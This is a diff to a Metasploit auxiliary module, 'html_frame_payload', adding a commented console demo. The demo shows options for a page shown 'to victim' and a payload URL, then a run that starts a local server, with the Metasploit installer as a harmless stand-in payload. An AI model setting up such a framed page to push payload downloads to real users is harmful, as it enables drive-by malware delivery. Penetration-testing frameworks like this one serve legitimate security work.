@@ -92,3 +92,35 @@ class Metasploit3 < Msf::Auxiliary
 		exploit
         end
 end
+
+=begin
+
+msf > use auxiliary/server/html_frame_payload 
+msf  auxiliary(html_frame_payload) > show options
+
+Module options (auxiliary/server/html_frame_payload):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   DISPLAY_URL                   no        www.foo.tld - Webpage to display to victim.
+   PAYLOAD_URL                   yes       foo.tld/exploit.jar - URL of payload.
+   Proxies                       no        Use a proxy chain
+   RHOST                         no        DISPLAY_URL provides RHOST
+   RPORT        80               no        DISPLAY_URL Server Port
+   SRVHOST      192.168.171.153  yes       Local HTTP Server IP Address
+   SRVPORT      80               yes       Local HTTP Server Port
+   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH      /                no        The URI to use for this module (default is "/")
+   VHOST                         no        HTTP server virtual host
+
+msf  auxiliary(html_frame_payload) > set display_url www.metasploit.com/download/
+display_url => www.metasploit.com/download/
+msf  auxiliary(html_frame_payload) > set payload_url downloads.metasploit.com/data/releases/metasploit-latest-windows-installer.exe
+payload_url => downloads.metasploit.com/data/releases/metasploit-latest-windows-installer.exe
+msf  auxiliary(html_frame_payload) > run
+
+[*] Using URL: http://192.168.171.153:80/
+[*] Server started.
+[+] Displaying www.metasploit.com/download/ to 192.168.171.153
+
+=end
